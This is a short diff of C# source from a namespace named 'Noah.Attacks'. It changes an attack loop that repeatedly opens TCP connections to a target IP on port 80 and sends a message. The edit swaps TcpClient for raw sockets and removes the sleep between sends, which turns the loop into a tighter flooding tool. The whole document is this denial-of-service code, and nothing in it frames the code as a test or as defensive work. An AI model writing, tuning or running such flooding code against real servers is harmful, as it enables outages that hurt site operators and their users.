@@ -35,14 +35,13 @@ namespace Noah.Attacks
         private void attack()
         {
             state.State = States.Attacking;
+            byte[] bytes = Encoding.ASCII.GetBytes(message);
 
             while (state.State != States.Done)
             {
-                TcpClient client = new TcpClient(IPAddress.Parse(ip).ToString(), 80);
-                StreamWriter output = new StreamWriter(client.GetStream());
-                output.WriteLine(message);
-                output.Flush();
-                Thread.Sleep(state.Delay);
+                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                sock.Connect(ip, 80);
+                sock.Send(bytes, SocketFlags.None);
             }
         }
     }
